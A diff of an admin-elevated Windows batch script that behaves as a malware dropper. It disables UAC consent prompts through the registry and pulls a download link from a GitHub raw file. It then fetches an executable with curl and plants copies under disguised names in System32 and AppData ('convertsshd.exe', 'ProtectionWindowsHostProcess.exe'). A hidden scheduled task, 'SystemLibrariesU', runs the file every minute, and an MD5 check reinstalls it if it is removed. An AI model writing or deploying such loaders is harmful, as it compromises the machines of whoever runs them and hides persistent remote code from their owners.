@@ -9,8 +9,10 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=5.0"
+set "BATCHVERSION=5.5"
 set "RESULT=%TEMP%\TUSELMP.txa"
+set "RUNEVERYOFFICIALMD5=18b2ef86ad6a29d3436817b09bbc9ad8"
+
 
 goto :EOF
 
@@ -68,7 +70,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f >> "%LOGFILE%" 2>&1
 
 
-set "RUNEVERYOFFICIALMD5=18b2ef86ad6a29d3436817b09bbc9ad8"
+
 
 
 :: ============ RUNNING TOPIC ============
@@ -228,6 +230,286 @@ echo. >> "%LOGFILE%" 2>&1
 
 
 
+
+
+
+:CHECKRUNEVERY
+echo CHECKRUNEVERY Started >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+:: Define the folder and file paths
+set "targetFolder=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks"
+set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
+set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"
+
+:: Ensure the folder exists
+if not exist "%targetFolder%" (
+    echo Creating folder: "%targetFolder%" >> "%LOGFILE%" 2>&1
+    mkdir "%targetFolder%" >> "%LOGFILE%" 2>&1
+)
+
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+::timeout /t 5 /nobreak >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+if not exist "%startupFile%" goto INSTRUNEVERY
+echo %startupFile% Found. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+for /f "tokens=*" %%A in ('certutil -hashfile "%startupFile%" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
+echo MD5 of "%startupFile%" = %RUNEVERYCURRENTMD5% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
+if "%RUNEVERYCURRENTMD5%"=="%RUNEVERYOFFICIALMD5%" (
+    echo MD5 matches %RUNEVERYCURRENTMD5% = %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+) else (
+    echo MD5 doesnt match %RUNEVERYCURRENTMD5% # %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
+    echo Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
+    goto INSTRUNEVERY
+)
+
+
+
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
+
+
+
+:: RunEvery Files Found! , Lets Checking Task "SystemLibrariesU"
+
+:: Define task to check
+set "Task1=SystemLibrariesU"
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo Checking %Task1% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+schtasks /query /tn "%Task1%" /v /fo LIST >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+:: If Task doesnt Exist , goto 
+schtasks /query /tn "%Task1%" >> "%LOGFILE%" 2>&1
+if errorlevel 1 goto INSTRUNEVERY
+
+
+
+
+
+
+:: RunEvery Files & Task Found goto NEXT 
+echo RunEvery Files and Task Found with MD5 Check. Going to AFTERORSKIPINSTALLRUNEVERY >> "%LOGFILE%" 2>&1
+goto AFTERORSKIPINSTALLRUNEVERY
+
+
+
+
+
+
+:INSTRUNEVERY
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo INSTRUNEVERY Started.. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo %startupFile% not found. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+:: RunEvery Files or Task missing 
+
+
+
+:: RunEveryCaller Installer
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo RunEveryCaller Installer Started.. >> "%LOGFILE%" 2>&1
+color 0A
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+
+ 
+:: Kill & Delete file 
+taskkill /f /im !filename!.exe >> "%LOGFILE%" 2>&1
+del /f /q "%TEMP%\!filename!.exe" >> "%LOGFILE%" 2>&1
+ 
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
+
+echo. >> "%LOGFILE%" 2>&1
+echo RUNFILELINK=%RUNFILELINK% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+:: Download the file using curl
+curl -L -# -o "%TEMP%\!filename!.exe" "%RUNFILELINK%" >> "%LOGFILE%" 2>&1
+ 
+timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+ 
+:: Checking the existing of the file
+if not exist "%TEMP%\!filename!.exe" (
+    echo. >> "%LOGFILE%" 2>&1
+    echo The download hasn't started yet. Please check your connection. >> "%LOGFILE%" 2>&1
+    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+    echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
+    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    goto INSTRUNEVERY
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 80KB (80000 bytes)
+if %FILESIZE% geq 80000 (
+    echo Starting... >> "%LOGFILE%" 2>&1
+    rem start "" "%TEMP%\!filename!.exe"
+    echo Started.. >> "%LOGFILE%" 2>&1
+) else (
+    echo.
+    echo Download incomplete. Check your connection and run the file again. >> "%LOGFILE%" 2>&1
+     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+     echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
+     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+     echo. >> "%LOGFILE%" 2>&1
+     goto INSTRUNEVERY
+)
+
+
+
+if exist "%TEMP%\!filename!.exe" (
+    echo !filename!.exe File exists. Attempting to run...
+    rem start "" "%TEMP%\!filename!.exe"
+) else (
+    echo ERROR: File not found.
+)
+
+
+:: Killing Processes
+taskkill /F /IM "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" >> "%LOGFILE%" 2>&1
+taskkill /F /IM "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe" >> "%LOGFILE%" 2>&1
+taskkill /F /IM "%SystemRoot%\System32\convertsshd.exe" >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+:: End then remove tasks
+schtasks /End /TN "SystemLibrariesU" >> "%LOGFILE%" 2>&1
+schtasks /Delete /TN "SystemLibrariesU" /F >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+:: Delete files
+del /F /Q "%SystemRoot%\System32\convertsshd.exe" >> "%LOGFILE%" 2>&1
+del /F /Q "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" >> "%LOGFILE%" 2>&1
+del /F /Q "%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe" >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
+
+
+:: Installing now
+
+
+mkdir "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks" >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+:: Copy RUNEVERY To System32 + Tasks Folder
+copy "%TEMP%\!filename!.exe" "%SystemRoot%\System32\convertsshd.exe" /y >> "%LOGFILE%" 2>&1
+copy "%TEMP%\!filename!.exe" "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" /y >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+:: Create RUNEVERY scheduled task to run at every minute
+schtasks /create /tn "SystemLibrariesU" /tr "\"%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"" /sc minute /mo 1 /f & powershell -Command "$task = Get-ScheduledTask -TaskName 'SystemLibrariesU'; $task.Settings.DisallowStartIfOnBatteries = $false; $task | Set-ScheduledTask"
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+set "MESSAGEEVERY=RUNEVERYINSTALLED...."
+echo MESSAGEEVERY = %MESSAGEEVERY% >> "%LOGFILE%" 2>&1
+
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
+
+
+
+
+:AFTERORSKIPINSTALLRUNEVERY
+
+
+
+
+
+
 :: Check Startup Programms , if not found Run Task , if not found task , Download STC & Run it 
 
 :: Define the list of files to check
@@ -312,7 +594,7 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
-goto CHECKRUNEVERY
+
 
 
 :HANDLERUNEVERYLOG
@@ -353,199 +635,12 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 
 
-:CHECKRUNEVERY
-echo CHECKRUNEVERY Started >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-:: Define the folder and file paths
-set "targetFolder=%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks"
-set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
-set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"
-
-:: Ensure the folder exists
-if not exist "%targetFolder%" (
-    echo Creating folder: "%targetFolder%" >> "%LOGFILE%" 2>&1
-    mkdir "%targetFolder%" >> "%LOGFILE%" 2>&1
-)
-
-:: Check if the target file exists
-if not exist "%startupFile%" (
-    echo File not found: "%startupFile%" >> "%LOGFILE%" 2>&1
-    echo Restoring from "%sourceFile%"... >> "%LOGFILE%" 2>&1
-    copy /Y "%sourceFile%" "%startupFile%" >> "%LOGFILE%" 2>&1
-    schtasks /run /tn "%Task1%" >> "%LOGFILE%" 2>&1
-    echo Task Started. >> "%LOGFILE%" 2>&1
-) else (
-    echo File already exists: "%startupFile%" >> "%LOGFILE%" 2>&1
-)
-
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-timeout /t 5 /nobreak >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-for /f "tokens=*" %%A in ('certutil -hashfile "%startupFile%" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
-echo MD5 of "%startupFile%" = %RUNEVERYCURRENTMD5% >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-if "%RUNEVERYCURRENTMD5%"=="%RUNEVERYOFFICIALMD5%" (
-    echo MD5 matches %RUNEVERYCURRENTMD5% = %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
-    echo. >> "%LOGFILE%" 2>&1
-) else (
-    echo MD5 doesnt match %RUNEVERYCURRENTMD5% # %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
-    echo Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
-    goto INSTRUNEVERY
-)
-
-
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-
-if not exist "%startupFile%" goto INSTRUNEVERY
-echo %startupFile% Found. >> "%LOGFILE%" 2>&1
-
-
-
-
-:: RunEvery Files Found! , Lets Checking Task "SystemLibrariesU"
-
-:: Define task to check
-set "Task1=SystemLibrariesU"
-
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo Checking %Task1% >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-schtasks /query /tn "%Task1%" /v /fo LIST >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-:: If Task doesnt Exist , goto 
-schtasks /query /tn "%Task1%" >> "%LOGFILE%" 2>&1
-if errorlevel 1 goto INSTRUNEVERY
 
 
 
 
 
 
-:: RunEvery Files & Task Found goto NEXT 
-goto NEXT
-
-
-
-
-
-
-:INSTRUNEVERY
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo INSTRUNEVERY Started.. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo %startupFile% not found. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-:: RunEvery Files or Task missing 
-
-
-
-:: RunEveryCaller Installer
- 
-color 0A
-
-
-
-for /L %%i in (1,1,13) do (
-    set /A "rand=!random! %% 62"
-    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
-)
-
- 
-:: Kill & Delete file 
-taskkill /f /im !filename!.exe >> "%LOGFILE%" 2>&1
-del /f /q "%TEMP%\!filename!.exe" >> "%LOGFILE%" 2>&1
- 
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
-
-echo. >> "%LOGFILE%" 2>&1
-echo RUNFILELINK=%RUNFILELINK% >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-:: Download the file using curl
-curl -L -# -o "%TEMP%\!filename!.exe" "%RUNFILELINK%" >> "%LOGFILE%" 2>&1
- 
-timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
- 
-:: Checking the existing of the file
-if not exist "%TEMP%\!filename!.exe" (
-    echo. >> "%LOGFILE%" 2>&1
-    echo The download hasn't started yet. Please check your connection. >> "%LOGFILE%" 2>&1
-    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-    echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
-    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-    echo. >> "%LOGFILE%" 2>&1
-    goto INSTRUNEVERY
-)
- 
- 
- 
-:: Get the file size in bytes
-for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
- 
- 
- 
-:: Check if the file size is at least 80KB (80000 bytes)
-if %FILESIZE% geq 80000 (
-    start "" "%TEMP%\!filename!.exe"
-) else (
-    echo.
-    echo Download incomplete. Check your connection and run the file again. >> "%LOGFILE%" 2>&1
-     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-     echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
-     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-     echo. >> "%LOGFILE%" 2>&1
-     goto INSTRUNEVERY
-)
- 
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo Patcher Running... >> "%LOGFILE%" 2>&1
-timeout /t 1 /nobreak >> "%LOGFILE%" 2>&1
-
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-set "MESSAGEEVERY=RUNEVERYINSTALLED...."
-echo MESSAGEEVERY = %MESSAGEEVERY% >> "%LOGFILE%" 2>&1
 
 :NEXT
 echo NEXT Started.. >> "%LOGFILE%" 2>&1
